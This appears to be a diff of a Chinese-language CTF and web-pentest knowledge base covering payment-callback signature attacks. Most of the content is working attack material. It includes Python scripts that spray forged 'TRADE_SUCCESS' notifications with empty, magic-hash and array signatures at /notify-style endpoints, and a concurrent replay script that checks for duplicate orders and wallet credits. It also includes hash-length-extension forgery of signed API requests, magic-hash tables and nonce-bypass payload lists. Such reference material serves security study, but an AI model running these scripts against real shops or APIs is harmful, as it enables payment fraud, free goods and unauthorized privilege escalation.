@@ -16824,6 +16824,69 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 └─────────────────────────────────────────────────────────────────┘
 ```
 
+### 0.1 支付回调实现缺陷路由
+
+支付回调里最常见的错误不是算法本身，而是实现层把“签名结果”转成了松比较、异常默认通过、字段覆盖或空值通过。拿到一个 `/notify`、`/callback`、`/webhook/pay` 入口后，先按语言/框架信号选择 payload 家族。
+
+| 信号 | 优先 payload | 命中标志 | 下一跳 |
+|---|---|---|---|
+| PHP / Laravel / ThinkPHP | `sign[]=x`, magic hash, `trade_status=TRADE_SUCCESS` | `NULL == 0`、`0e... == 0e...`、变量覆盖 | `payment-callback-async.md` |
+| Python / Flask / FastAPI | 缺字段、复杂类型、NaN/Infinity、异常路径 | 异常后仍处理 paid 分支 | `payment-logic.md` |
+| Node.js / Express / Next.js | `sign` 数组/对象、`Buffer` 长度错位、`==` | 空对象/数组被当真值或同值 | `payment-bypass.md` |
+| Java / Spring | `null` 字段、BigInteger 前导零、编码差异 | NPE fallback、签名十六进制规范化错位 | `06-replay-nonce.md` |
+| 任意语言 | 空签名、短签名、截断签名、重复参数 | 响应从 invalid 变 success，订单状态变化 | `../12-payment/payment-logic.md` |
+
+```python
+# signature_impl_payment_matrix.py — 回调签名实现缺陷打点
+import itertools
+import json
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+PATHS = ["/notify", "/callback", "/payment/notify", "/api/payment/notify", "/webhook/pay"]
+PAYLOADS = [
+    {"out_trade_no": "ORDER_ID", "trade_status": "TRADE_SUCCESS", "total_amount": "0.01", "sign": ""},
+    {"out_trade_no": "ORDER_ID", "trade_status": "TRADE_SUCCESS", "total_amount": "0.01", "sign": "0e462097431907509062922748828256"},
+    {"out_trade_no": "ORDER_ID", "status": 0, "amount": "0.01", "signature": "x"},
+    {"out_trade_no": "ORDER_ID", "paid": True, "sign": ["x"]},
+    {"out_trade_no": "ORDER_ID", "trade_status": "TRADE_SUCCESS", "sign": {"value": "x"}},
+]
+HEADERS = [
+    {"Content-Type": "application/json"},
+    {"Content-Type": "application/x-www-form-urlencoded"},
+    {"X-Signature": ""},
+    {"X-Signature": "0e462097431907509062922748828256"},
+]
+
+def send(path, body, headers):
+    is_json = "json" in headers.get("Content-Type", "")
+    return S.post(BASE + path, json=body if is_json else None,
+                  data=body if not is_json else None,
+                  headers=headers, timeout=10, allow_redirects=False)
+
+for path, body, headers in itertools.product(PATHS, PAYLOADS, HEADERS):
+    r = send(path, body, headers)
+    print(json.dumps({
+        "path": path,
+        "payload_keys": list(body),
+        "headers": headers,
+        "status": r.status_code,
+        "len": len(r.text),
+        "sample": r.text[:160],
+    }, ensure_ascii=False))
+```
+
+### 0.2 成败 Oracle
+
+| Oracle | 记录字段 | 命中样本 |
+|---|---|---|
+| 响应 oracle | status、body hash、`success/fail/invalid sign` | 同 payload 家族从拒绝变接受 |
+| 订单 oracle | `orders.status`, `payments.status`, `paid_at` | pending → paid |
+| 权益 oracle | `vip_until`, `license_key`, `download_url`, `credits` | 权益新增或 flag 出现 |
+| 幂等 oracle | `transaction_id`, `notify_id`, 发货次数 | 同一事件多次处理 |
+
 ## 1. PHP 实现缺陷
 
 ### 1.1 strcmp/memcmp 数组绕过
@@ -16947,72 +17010,7 @@ def test_hash_array_bypass(base_url: str):
                 "order_id": "TEST",
                 "status": "paid",
                 sign_field: ["injected"],       # ← JSON 数组 → md5(["injected"]) → NULL
-            }, timeout=10)
-            if r.status_code == 200 and "fail" not in r.text.lower():
-                print(f"[!] md5 array bypass: {path} via {sign_field}=[]  ({r.status_code})")
 
-        # ==== 场景 2: 两个数组值 ====
-        # 后端: if (md5($_POST['a']) === md5($_POST['b']))
-        # POST a[]=1&b[]=2 → md5([]) === md5([]) → NULL === NULL → true
-        r = requests.post(base_url + path,
-            data="a[]=1&b[]=2",
-            headers={"Content-Type": "application/x-www-form-urlencoded"},
-            timeout=10)
-        if r.status_code == 200 and "fail" not in r.text.lower():
-            print(f"[!] md5 dual array bypass: {path}  ({r.status_code})")
-
-        # ==== 场景 3: sha1 数组 ====
-        r = requests.post(base_url + path, json={
-            "data": ["payload"],               # sha1(["payload"]) → NULL
-            "expected": "reserved_value",       # == 比较下 NULL == "" → 可能 true
-        }, timeout=10)
-        if r.status_code == 200 and "fail" not in r.text.lower():
-            print(f"[!] sha1 array bypass: {path}  ({r.status_code})")
-
-    # AJAX 返回: (仅用于理解，不执行)
-    return """
-    要点:
-    - md5([]) 返回 NULL, sha1([]) 返回 NULL
-    - 如果两个比较值都是 NULL → PHP 8.0 以前 == 为 true, === 也为 true
-    - 传 data[]=x 给 md5() → 绕过
-    - 使用 PHP 8.0+ 时, string 函数对数组抛出 TypeError 而非 warning
-    - 但如果在 try/catch 中: catch {} → 可能 fallback 到允许通过
-    """
-```
-
-### 1.3 PHP Type Juggling — == vs ===
-
-PHP 的宽松比较（`==`）是签名实现的最大漏洞源。
-
-```python
-# php_type_juggling.py — PHP 宽松比较完全利用
-
-# ===== 1. Magic Hash 攻击 =====
-# "0e462097..." == "0e848240..." → true (都是 0×10^n)
-# 如果签名比较用 ==:   if (md5($input) == $stored_hash)
-# 找到一个 md5() 结果以 "0e" 开头的输入 → 永远匹配
-
-MAGIC_HASHES = {
-    # === MD5: 原文 → hash → 攻击方法 ===
-    "240610708":    "0e462097431907509062922748828256",
-    "QNKCDZO":      "0e830400451993494058024219903391",
-    "aabg7XSs":     "0e087386482136013740957780965295",
-    "aabC9RqS":     "0e041022518165728065344349536299",
-    "s878926199a":  "0e545993274517709034328855841020",
-    "s155964671a":  "0e342768416822451524974117254469",
-    "s214587387a":  "0e848240448830537924465865611904",
-    "s1091221200a": "0e940624217856561557816327384675",
-    "s1885207154a": "0e509367213418206700842008763514",
-    "s1502113478a": "0e861580163291561247404381396064",
-    "s1836677006a": "0e481036490867661113260034900752",
-    "s1184209335a": "0e072485820392773389523109082030",
-    "s1665632922a": "0e731198061491163073197128363787",
-    "s1501420657a": "0e342624769297644179755014271379",
-
-    # === SHA1 magic hashes ===
-    "aaroZmOk":     "0e66507019969427134894567494305185566735",
-    "aaK1STfY":     "0e76658526655756207688271159624026011393",
-    "aaO8zKZF":
 
 [... content truncated for size ...]
 
@@ -17732,6 +17730,42 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 > Hash Length Extension (HLE) 是 MD5/SHA1/SHA2 家族的一个结构缺陷：知道 `H(secret || message)` 后，你可以在**不知道 secret** 的情况下算出 `H(secret || message || padding || append)`。这对所有 `H(secret || message)` 构造的签名都是致命的。
 
+## 0. HLE 路由矩阵
+
+拿到 `sign=32/40/64 hex` 时，不要只看长度就下结论。先还原签名串、参数顺序、secret 位置、服务端取第一个还是最后一个重复参数，再决定是否走 HLE。
+
+| 信号 | 立即动作 | 可打标志 | 分叉 |
+|---|---|---|---|
+| `sign=md5(secret + query)` | 爆 secret 长度，追加 `&status=paid` | forged sign 被接受 | 支付回调链 |
+| `sign=sha256(secret + body)` | 固定 body 原文，append JSON/表单尾部 | 响应从 invalid 变 success | API/GraphQL 链 |
+| `sign=md5(query + secret)` | 测尾拼接、重复参数、截断 | HLE 多数不成立，转实现缺陷 | `02-implementation.md` |
+| HMAC-SHA256 | 转时序/空签/字段覆盖 | HLE 不成立 | `02-implementation.md` |
+| 自定义 session `data|md5(secret+data)` | append role/admin 字段 | cookie/session 权限变化 | auth 链 |
+
+```python
+# hle_route_classifier.py — 从样本判断 HLE 是否值得投入
+import re
+
+HEX_LEN = {32: "md5", 40: "sha1", 64: "sha256", 128: "sha512"}
+
+def classify_hle_sample(sign, signed_message, error_text=""):
+    algo = HEX_LEN.get(len(sign), "unknown")
+    hints = []
+    if re.fullmatch(r"[0-9a-fA-F]+", sign or ""):
+        hints.append(f"hex:{algo}")
+    if any(x in error_text.lower() for x in ["hmac", "mac", "digest"]):
+        hints.append("maybe_hmac")
+    if "&" in signed_message or "=" in signed_message:
+        hints.append("query_or_form")
+    if signed_message.strip().startswith(("{", "[")):
+        hints.append("json_body")
+    if "timestamp" in signed_message or "nonce" in signed_message:
+        hints.append("replay_window")
+    return {"algo": algo, "hints": hints, "try_hle": algo != "unknown" and "maybe_hmac" not in hints}
+
+print(classify_hle_sample("a" * 32, "out_trade_no=1001&amount=0.01"))
+```
+
 ## 1. 理论：为什么能扩展
 
 ### 1.1 Merkle-Damgard 结构
@@ -18030,59 +18064,7 @@ def double_key_extension():
 # api_sign_extension.py — API 请求签名扩展
 """
 API 签名模式：
-    sign = SHA256(api_secret + method + path + body + timestamp)
-
-    如果知道一个合法请求的 sign，可以扩展参数。
-"""
-
-def forge_api_request():
-    """扩展 API 请求参数"""
-    import hashpumpy
-
-    # 已知签名示例
-    original_method = "GET"
-    original_path = "/api/v1/user/info"
-    original_body = ""
-    original_ts = "1700000000"
-    original_sign = "abc123..."  # SHA256(secret + GET + /api/v1/user/info + + 1700000000)
-
-    # 构造: 加入 admin 参数
-    # 原始: secret + "GET/api/v1/user/info1700000000"
-    # 扩展: secret + "GET/api/v1/user/info1700000000" + padding + "&admin=1"
-
-    original_msg = original_method + original_path + original_body + original_ts
-
-    # 尝试扩展 secret 长度
-    for secret_len in range(8, 65):
-        forged_sig, forged_full = hashpumpy.hashpumpy(
-            original_sign,
-            original_msg.encode(),
-            b"&admin=1&role=superuser",
-            secret_len,
-            hashpumpy.SHA256
-        )
-
-        # 发送伪造请求（需要特定的 HTTP 库发送含 padding 的请求）
-        # 注意: 请求必须发送 forged_full 包含的 padding 字节
-        print(f"Try len={secret_len}: sig={forged_sig[:16]}... msg_len={len(forged_full)}")
-```
-
-### 4.2 GraphQL 签名扩展
-
-```python
-# GraphQL 查询签名扩展
-GRAPHQL_SIGN_EXAMPLE = {
-    "query": "query { user(id: 1) { name email } }",
-    "sign": "a1b2c3d4..."
-}
-
-# 如果 sign = MD5(secret + query + operationName)
-# 可以在 query 后插入恶意字段
-def graphql_extension():
-    original_query = "query { user(id: 1) { name email } }"
-    append_query = " adminInfo { secretKey } "
-
-    forged_sig, forged_full = hashpump
+    sign = SHA256(api_sec
 
 [... content truncated for size ...]
 
@@ -18124,6 +18106,63 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
     ├── N 秒窗口内重放
     ├── 并发窗口 (竞态)
     └── 窗口调整攻击
+```
+
+### 0.1 支付/订单重放路由
+
+支付回调和订单 API 的重放目标不是“第二次 200”，而是服务端副作用：多次发货、余额增加、退款后权益保留、跨订单入账。
+
+| 重放对象 | 关键字段 | 变体 | 命中标志 |
+|---|---|---|---|
+| 支付 notify | `out_trade_no`, `transaction_id`, `notify_id` | 同 tx、新 notify、空白/NUL/大小写 | 同订单多次权益 |
+| 订单发货 | `order_id`, `delivery_id`, `idempotency_key` | 并发、重试、失败后重发 | 多条 delivery/license |
+| 优惠券兑换 | `coupon_code`, `user_id`, `nonce` | 同码并发、跨商品、跨账号 | 折扣/余额重复增加 |
+| 退款/取消 | `refund_id`, `order_status`, `timestamp` | paid/cancel/refund 乱序 | 退款成功且权益仍在 |
+| API 签名 | `nonce`, `ts`, `sign` | 预测 nonce、未来/过去 ts | 签名请求跨时间窗口接受 |
+
+```python
+# replay_payment_oracle.py — 重放前后状态差分
+import concurrent.futures
+import json
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+def snapshot(order_id):
+    paths = {
+        "order": f"/api/orders/{order_id}",
+        "payment": f"/api/payment/{order_id}",
+        "delivery": f"/api/orders/{order_id}/delivery",
+        "wallet": "/api/wallet",
+        "me": "/api/me",
+    }
+    out = {}
+    for name, path in paths.items():
+        r = S.get(BASE + path, timeout=8, allow_redirects=False)
+        out[name] = {"status": r.status_code, "len": len(r.text), "body": r.text[:500]}
+    return out
+
+def replay_notify(order_id, tx="TX_REPLAY_001", notify="N_REPLAY_001"):
+    body = {
+        "out_trade_no": order_id,
+        "transaction_id": tx,
+        "notify_id": notify,
+        "trade_status": "TRADE_SUCCESS",
+        "total_amount": "0.01",
+    }
+    return S.post(BASE + "/notify", json=body, timeout=10, allow_redirects=False)
+
+def concurrent_replay(order_id, n=20):
+    before = snapshot(order_id)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+        res = list(ex.map(lambda i: replay_notify(order_id, notify=f"N_REPLAY_{i}"), range(n)))
+    after = snapshot(order_id)
+    print(json.dumps({
+        "before": before,
+        "responses": [{"status": r.status_code, "len": len(r.text), "body": r.text[:120]} for r in res],
+        "after": after,
+    }, ensure_ascii=False, indent=2))
 ```
 
 ## 1. 纯重放攻击
@@ -18397,67 +18436,7 @@ def predict_weak_random_nonce():
     # Mersenne Twister 恢复
     # 如果知道系统使用 Python random，收集 624 个整数 → 可完全恢复状态
     if len(set(nonces)) > 100:
-        print(f"[*] Nonce seems random, checking if MT19937...")
-        # 实际 MT 恢复需要更复杂的处理，这里仅做检测
-```
-
-## 3. Nonce 绕过
-
-### 3.1 缺失 / null / 空 nonce
-
-```python
-# nonce_bypass.py — Nonce 绕过测试
-import requests, json
-
-BASE = "https://target"
-S = requests.Session()
-
-NONCE_BYPASS_PAYLOADS = {
-    # 完全缺失
-    "missing": {},                                      # 不传 nonce 字段
-
-    # null / None (JSON)
-    "null_json": {"nonce": None},                       # JSON null
-    "null_string": {"nonce": "null"},                   # 字符串 "null"
-    "undefined": {"nonce": "undefined"},                # JS undefined 字符串
-
-    # 空值
-    "empty_string": {"nonce": ""},                      # 空字符串
-    "empty_array": {"nonce": []},                        # 空数组 []
-    "empty_object": {"nonce": {}},                       # 空对象 {}
-
-    # 零值
-    "zero_int": {"nonce": 0},                           # 整数 0
-    "zero_float": {"nonce": 0.0},                       # 浮点 0.0
-    "zero_string": {"nonce": "0"},                       # 字符串 "0"
-    "false_bool": {"nonce": False},                     # Boolean false
-
-    # 固定值
-    "fixed_once": {"nonce": "once"},                    # 特殊字符串
-    "same_as_last": {"nonce": "LAST_SEEN_NONCE"},       # 重复使用
-    "predicted": {"nonce": "PREDICTED_NEXT"},           # 预测值
-
-    # PHP 特色
-    "php_array": {"nonce[0]": "x", "nonce[1]": "y"},    # PHP 数组
-    "php_null": {"nonce": None},                         # PHP null === 未设置
-
-    # Python/Node 特色
-    "python_none": {"nonce": None},
-    "js_undefined": {"nonce": "undefined"},
-
-    # 类型混淆
-    "bool_true": {"nonce": True},                        # True == 1
-    "neg_one": {"nonce": -1},                            # 负数
-    "very_large": {"nonce": 9999999999999},              # 超大数
-    "float_nan": {"nonce": float("nan")},                # NaN
-}
-
-def test_nonce_bypass(endpoint: str, base_payload: dict):
-    """测试所有 nonce 绕过方式"""
-    for label, extra in NONCE_BYPASS_PAYLOADS.items():
-        payload = {**base_payload, **extra}
-
-        # 如果
+        print(f"[*] Nonce seems random, checking i
 
 [... content truncated for size ...]
 
